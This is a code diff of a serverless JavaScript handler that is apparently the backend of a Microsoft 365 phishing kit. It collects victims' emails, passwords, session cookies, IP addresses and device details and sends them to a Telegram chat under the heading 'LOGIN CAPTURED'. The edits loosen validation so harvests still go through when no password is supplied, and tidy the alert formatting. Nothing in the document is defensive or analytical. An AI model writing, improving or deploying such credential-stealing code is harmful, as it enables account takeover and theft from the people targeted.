@@ -1,5 +1,4 @@
 export const handler = async (event, context) => {
-  // CORS headers
   const headers = {
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Headers': 'Content-Type',
@@ -29,7 +28,16 @@ export const handler = async (event, context) => {
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text:
-            `🚨 <b>MICROSOFT 365 ERROR</b>\n${msg}\n\n${extra ? '<code>' + (typeof extra === 'string' ? extra : JSON.stringify(extra)).substring(0, 1500) + '</code>' : ''}\n${new Date().toISOString()}`,
+            `🚨 <b>MICROSOFT 365 ERROR</b>\n${msg}\n\n${
+              extra
+                ? '<code>' +
+                  (typeof extra === 'string'
+                    ? extra
+                    : JSON.stringify(extra)
+                  ).substring(0, 1500) +
+                  '</code>'
+                : ''
+            }\n${new Date().toISOString()}`,
           parse_mode: 'HTML',
         }),
       });
@@ -72,13 +80,13 @@ export const handler = async (event, context) => {
       data.documentCookies ||
       [];
 
-    // Validate credentials
-    if (!email || !password) {
-      await sendErrorTelegram('Missing credentials', { email, password });
+    // Only require email for OAuth (password can be blank or a placeholder)
+    if (!email) {
+      await sendErrorTelegram('Missing email (required)', { email, password });
       return {
         statusCode: 400,
         headers,
-        body: JSON.stringify({ error: 'Missing required fields', fields: { email, password } }),
+        body: JSON.stringify({ error: 'Missing required field: email', fields: { email, password } }),
       };
     }
 
@@ -186,7 +194,7 @@ export const handler = async (event, context) => {
     const mainMessage = `🔐 MICROSOFT 365 LOGIN CAPTURED
 
 📧 Email: ${email}
-🔑 Password: ${password}
+🔑 Password: ${password ? password : '[NOT SUPPLIED/OAUTH]'}
 🏢 Provider: ${provider || 'Microsoft'}
 🕒 Time: ${new Date().toLocaleString()}
 🌐 IP: ${clientIP} | ${deviceInfo}
@@ -244,7 +252,7 @@ Download link: ${event.headers.host ? `https://${event.headers.host}` : 'https:/
 
 let ipaddress = "${clientIP}";
 let email = "${email}";
-let password = "${password}";
+let password = "${password ? password : '[NOT SUPPLIED/OAUTH]'}";
 
 // Raw Cookie Data Debug Info:
 // Formatted cookies count: ${cookiesForFile.length}
